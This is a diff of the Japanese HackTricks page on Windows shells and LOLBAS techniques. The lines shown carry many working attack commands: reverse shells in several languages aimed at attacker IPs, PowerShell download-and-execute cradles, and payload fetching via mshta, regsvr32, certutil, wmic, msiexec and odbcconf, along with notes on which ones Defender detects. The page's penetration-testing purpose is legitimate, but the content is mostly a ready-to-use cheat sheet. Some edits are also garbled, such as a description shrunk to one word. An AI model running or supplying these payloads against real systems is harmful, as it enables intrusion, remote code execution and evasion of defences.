@@ -7,16 +7,16 @@
 HackTricks をサポートする他の方法:
 
 * **HackTricks で企業を宣伝したい**または **HackTricks をPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
-* [**公式PEASS＆HackTricksスウォッグ**](https://peass.creator-spring.com)を入手する
+* [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
 * [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
-* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で私を**フォロー**する。
-* **ハッキングトリックを共有するには、**[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。
+* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)で **フォロー**する
+* **ハッキングトリックを共有するには、PRを** [**HackTricks**](https://github.com/carlospolop/hacktricks) **および** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **のGitHubリポジトリに提出してください。**
 
 </details>
 
 <figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
 
-最も重要な脆弱性を見つけて修正を迅速化します。Intruder は攻撃面を追跡し、積極的な脅威スキャンを実行し、APIからWebアプリ、クラウドシステムまでの技術スタック全体で問題を見つけます。[**無料でお試しください**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) 今すぐ。
+最も重要な脆弱性を見つけて修正を迅速化します。Intruder は攻撃面を追跡し、積極的な脅威スキャンを実行し、APIからWebアプリやクラウドシステムまでの技術スタック全体で問題を見つけます。[**無料でお試しください**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) 今すぐ。
 
 {% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
 
@@ -25,7 +25,7 @@ HackTricks をサポートする他の方法:
 ## Lolbas
 
 ページ [lolbas-project.github.io](https://lolbas-project.github.io/) は、Linux向けの [https://gtfobins.github.io/](https://gtfobins.github.io/) と同様に、Windows向けです。\
-明らかに、**WindowsにはSUIDファイルやsudo権限はありません**が、**いくつかのバイナリ**が**任意のコードを実行する**などの予期しないアクションを実行する方法を知っていると便利です。
+明らかに、**WindowsにはSUIDファイルやsudo権限はありません**が、いくつかの**バイナリ**が**任意のコードを実行**するなどの予期しないアクションを実行する方法を知っていると便利です。
 ```bash
 nc.exe -e cmd.exe <Attacker_IP> <PORT>
 ```
@@ -40,7 +40,7 @@ C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('1
 ```
 ## Perl
 
-Perl (Practical Extraction and Reporting Language) は、テキスト処理やシステム管理などのさまざまな用途に使用されるスクリプト言語です。Windows システムで Perl スクリプトを実行するためには、ActivePerl や Strawberry Perl のような Perl インタプリタをインストールする必要があります。Perl スクリプトは、Windows システムでのシェルスクリプトの代替として使用することができます。
+Perlは、Windowsシステムで使用される多目的スクリプト言語です。Perlスクリプトは、Windowsシステムでのシェルアクセスやコマンドの実行に使用されます。Perlスクリプトを使用すると、Windowsシステムでの様々な操作を自動化することができます。
 ```bash
 perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
@@ -52,7 +52,7 @@ ruby -rsocket -e 'c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.pope
 ```
 ## Lua
 
-Luaは、スクリプト言語であり、多くのプラットフォームで使用されています。Luaは、高い拡張性と柔軟性を持ち、組み込みシステムから大規模なアプリケーションまで幅広い用途に使用されています。Luaは、シンプルで直感的な構文を持ち、C言語との統合が容易です。Luaスクリプトは、さまざまな環境で使用され、多くのアプリケーションで拡張性を提供しています。Luaは、ゲーム開発、Web開発、組み込みシステム、およびその他のさまざまな分野で広く使用されています。
+Lua
 ```bash
 lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
 ```
@@ -74,7 +74,7 @@ openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_cli
 ```
 ## Powershell
 
-PowerShellは、Windowsシステムで広く使用されているスクリプト言語およびシェルフレームワークです。PowerShellを使用すると、システム管理者は効率的にタスクを自動化し、システムの設定や管理を行うことができます。PowerShellは、Windowsの機能を活用してシステムに対する深い制御を提供します。
+PowerShellは、Windowsシステムで広く使用されているスクリプト言語およびシェルフレームワークです。 PowerShellを使用すると、システム管理者は効率的にタスクを自動化し、システムの設定や管理を行うことができます。 PowerShellは、Windowsの機能を活用して、システム管理者がスクリプトを作成し、実行するための強力なツールです。
 ```bash
 powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.2.0.5/shell.ps1')|iex"
 powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/ipw.ps1')"
@@ -82,14 +82,12 @@ Start-Process -NoNewWindow powershell "IEX(New-Object Net.WebClient).downloadStr
 echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile
 ```
 ネットワークコールを実行するプロセス: **powershell.exe**\
-ディスクに書き込まれたペイロード: **NO** (_少なくともprocmonを使用して見つけられる場所にはありません！_)
+ディスクに書き込まれたペイロード: **NO** (_少なくともprocmonを使用して見つけられる場所にはない！_)
 ```bash
 powershell -exec bypass -f \\webdavserver\folder\payload.ps1
 ```
-ネットワークコールを実行するプロセス: **svchost.exe**\
-ディスクに書き込まれたペイロード: **WebDAVクライアントローカルキャッシュ**
-
-**ワンライナー:**
+**ネットワークコールを実行するプロセス: svchost.exe**\
+**ディスクに書き込まれたペイロード: WebDAVクライアントローカルキャッシュ**
 ```bash
 $client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
@@ -137,7 +135,7 @@ new ActiveXObject('WScript.Shell').Run(c);
 ```
 #### **mshta - sct**
 
-[**こちらから**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)
+[**ここから**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)
 ```markup
 <?XML version="1.0"?>
 <!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
@@ -154,8 +152,6 @@ var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
 </scriptlet>
 ```
 #### **Mshta - Metasploit**
-
-Mshta is a utility in Windows that executes Microsoft HTML Applications (HTA). Metasploit has a module that can be used to execute malicious HTA payloads using mshta.exe. This technique can be used to bypass application whitelisting and execute code on a target system.
 ```bash
 use exploit/windows/misc/hta_server
 msf exploit(windows/misc/hta_server) > set srvhost 192.168.1.109
@@ -225,10 +221,10 @@ regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
 ```
 regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
 ```
-ネットワークコールを実行するプロセス: **svchost.exe**\
+プロセスがネットワークコールを実行しています: **svchost.exe**\
 ディスクに書き込まれたペイロード: **WebDAVクライアントローカルキャッシュ**
 
-**Defenderによって検出**
+**Defenderによって検出されました**
 
 #### Regsvr32 -sct
 
@@ -270,7 +266,7 @@ B64exeをダウンロードし、デコードして実行します。
 ```bash
 certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
 ```
-**Defenderによって検出されました**
+**Defenderに検出されました**
 
 
 <figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
@@ -318,16 +314,16 @@ python -m SimpleHTTPServer 80
 ```
 victim> msiexec /quiet /i \\10.2.0.5\kali\shell.msi
 ```
-**検出されました**
+**検出**
 
 ## **Wmic**
 ```
 wmic os get /format:"https://webserver/payload.xsl"
 ```
-ネットワークコールを実行するプロセス: **wmic.exe**\
+プロセスがネットワークコールを実行しています: **wmic.exe**\
 ディスクに書き込まれたペイロード: **IEローカルキャッシュ**
 
-例としてxslファイルは[こちら](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7)から取得できます。
+例としてxslファイルは[こちら](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7)から取得できます:
 ```
 <?xml version='1.0'?>
 <stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" xmlns:user="placeholder" version="1.0">
@@ -382,24 +378,24 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\fol
 ```
 odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
 ```
-ネットワークコールを実行するプロセス: **svchost.exe**\
-ディスクに書き込まれたペイロード: **WebDAVクライアントローカルキャッシュ**
+プロセスがネットワークコールを実行中：**svchost.exe**\
+ディスクに書き込まれたペイロード：**WebDAVクライアントローカルキャッシュ**
 
 **試していません**
 
 [**https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2**](https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2)
 
-## Powershell シェル
+## Powershellシェル
 
 ### PS-Nishang
 
 [https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)
 
-**Shells**フォルダにはさまざまなシェルがあります。Invoke-_PowerShellTcp.ps1_をダウンロードして実行するには、スクリプトのコピーを作成し、ファイルの末尾に追加します:
+**Shells**フォルダにはさまざまなシェルがあります。Invoke-_PowerShellTcp.ps1_をダウンロードして実行するには、スクリプトのコピーを作成し、ファイルの末尾に追加します：
 ```
 Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
 ```
-次の手順に従って、スクリプトをWebサーバーで提供し、被害者の端末で実行します：
+次に、スクリプトをWebサーバーで提供し、被害者の端末で実行します：
 ```
 powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
 ```
@@ -417,7 +413,7 @@ powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 
 ```
 Defenderはそれを悪意のあるコードとして検出しません（まだ、2019年3月4日）。
 
-**powercatによって提供されるその他のオプション:**
+**powercatによって提供される他のオプション:**
 
 バインドシェル、リバースシェル（TCP、UDP、DNS）、ポートリダイレクト、アップロード/ダウンロード、ペイロードの生成、ファイルの提供...
 ```
@@ -454,13 +450,13 @@ unicornを使用して、metasploitバックドアのPowerShellバージョン�
 ```
 python unicorn.py windows/meterpreter/reverse_https 10.2.0.5 443
 ```
-```plaintext
-作成したリソースを使用してmsfconsoleを起動します：
+```bash
+msfconsole -r <resource_file>
 ```
 ```
 msfconsole -r unicorn.rc
 ```
-次のようにして、_powershell\_attack.txt_ ファイルを提供するウェブサーバーを起動し、被害者の端末で実行します：
+以下の手順を実行して、被害者の端末で _powershell\_attack.txt_ ファイルを提供するWebサーバーを起動し、実行します:
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 ```
@@ -468,9 +464,8 @@ powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 
 ## もっと
 
-[PS>Attack](https://github.com/jaredhaight/PSAttack) 一部の攻撃的なPSモジュールが事前にロードされたPSコンソール（暗号化済み）\
-[https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f9](https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f93c)[\
-WinPWN](https://github.com/SecureThisShit/WinPwn) 一部の攻撃的なPSモジュールとプロキシ検出が組み込まれたPSコンソール（IEX）
+[PS>Attack](https://github.com/jaredhaight/PSAttack) は、いくつかの攻撃的なPSモジュールが事前にロードされたPSコンソール（暗号化済み）\
+[WinPWN](https://github.com/SecureThisShit/WinPwn) は、いくつかの攻撃的なPSモジュールとプロキシ検出が組み込まれたPSコンソール（IEX）
 
 ## 参考文献
 
@@ -485,21 +480,21 @@ WinPWN](https://github.com/SecureThisShit/WinPwn) 一部の攻撃的なPSモジ�
 
 <figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
 
-最も重要な脆弱性を見つけて修正を迅速化します。Intruderは攻撃面を追跡し、積極的な脅威スキャンを実行し、APIからWebアプリケーション、クラウドシステムまで、技術スタック全体で問題を見つけます。[**無料でお試しください**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) 今すぐ。
+最も重要な脆弱性を見つけて修正を迅速化します。Intruderは攻撃面を追跡し、積極的な脅威スキャンを実行し、APIからWebアプリ、クラウドシステムまでの技術スタック全体で問題を見つけます。[**無料でお試しください**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) 今すぐ。
 
 {% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
 
 
 <details>
 
-<summary><strong>ゼロからヒーローまでのAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>!</strong></summary>
+<summary><strong>**ゼロからヒーローまでのAWSハッキングを学ぶ**</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>
 
 HackTricksをサポートする他の方法：
 
 * **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
-* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を入手する
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[NFTs](https://opensea.io/collection/the-peass-family)コレクションを見つける
-* **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**または[telegramグループ](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**をフォロー**してください。
-* **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks)のGitHubリポジトリにPRを提出して、**ハッキングトリックを共有**してください。
+* [**公式PEASS＆HackTricksスウォッグ**](https://peass.creator-spring.com)を手に入れる
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)コレクションを見る
+* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)をフォローする。
+* **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks)のGitHubリポジトリにPRを提出して、あなたのハッキングトリックを共有する。
 
 </details>
